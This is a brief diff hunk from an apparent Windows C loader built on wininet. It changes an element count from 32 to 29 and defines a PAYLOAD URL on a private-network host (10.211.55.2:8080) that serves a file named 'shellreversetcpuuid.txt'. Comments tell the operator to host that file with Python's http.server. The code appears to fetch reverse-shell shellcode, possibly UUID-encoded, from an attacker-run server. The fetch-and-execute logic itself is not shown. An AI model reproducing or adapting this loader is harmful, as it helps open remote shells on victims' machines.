@@ -4,7 +4,7 @@
 
 #pragma comment(lib, "wininet.lib")
 
-#define NumberOfElements 32
+#define NumberOfElements 29
 // Python3 -m http.server 8080
 // Have shellreversetcpuuid.txt in the directory
 #define PAYLOAD L"http://10.211.55.2:8080/shellreversetcpuuid.txt"
